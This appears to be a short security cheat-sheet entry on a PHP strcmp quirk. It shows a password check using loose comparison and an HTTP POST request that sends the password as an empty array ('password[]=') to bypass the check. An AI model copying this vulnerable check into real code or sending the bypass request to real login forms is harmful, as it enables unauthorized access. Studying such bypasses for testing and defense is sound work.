# PHP Quirks

## strcmp

According to PHP manual strcmp function returns following values:
Returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal.

```php
<?php
    if(isset($_POST['password']))
    {   $password = $_POST['password'];
        if(strcmp($password, $actual_password)==0)
        {
            echo "YOU WON!";
        }
    }
?>
```

However, it is possible to manipulate the result of the strcmp function execution:

*Input as an Array*

Request:
```
POST / HTTP/1.1
Host: reverse-shell.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

password[]=
```

```
strcmp($secret, $_POST['password']) returns 0
```
